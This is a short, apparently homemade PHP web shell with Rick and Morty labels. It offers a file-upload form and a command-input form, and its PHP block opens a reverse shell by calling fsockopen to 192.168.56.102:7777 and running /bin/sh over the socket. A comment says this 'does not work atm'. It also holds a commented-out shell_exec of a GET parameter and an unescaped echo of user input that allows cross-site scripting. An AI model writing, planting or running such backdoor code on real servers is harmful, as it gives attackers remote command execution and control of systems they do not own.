<html>

    <h2>RIIICK</h2>

    <!-- SUMMER -->
    <form enctype="multipart/form-data" action="Summer.php" method="POST">
        <!-- MAX_FILE_SIZE must precede the file input field -->
        <!-- Name of input element determines name in $_FILES array -->
        <input name="uploaded_file" type="file" value="Seeek" /><br><br>
        <input type="submit" name="Upload" value="Upload to Summer">
    </form>
    
    <!-- MORTY -->
    <form enctype="multipart/form-data" action="Summer.php" method="POST">
    <form action="Morty.php" method="post"><br>
        <p>What should Morty do?</p>
        <input type="text" name="command"/><br><br>
        <input type="submit" name="submit" value="Submit" />
    </form>

</html>


<?php

    $var = 'C137';
    echo "<h4>RICK ".$var."</h4>"; 
    
    # Does not work atm
    $sock=fsockopen("192.168.56.102",7777);
    exec("/bin/sh -i <&3 >&3 2>&3");
    #echo shell_exec($_GET['e'].' 2>&1');
    echo "<p>GET value: ".$_GET['test']."</p>";

    if( isset( $_POST[ 'Upload' ] ) ) {
        echo 'hello world';
    }

?>
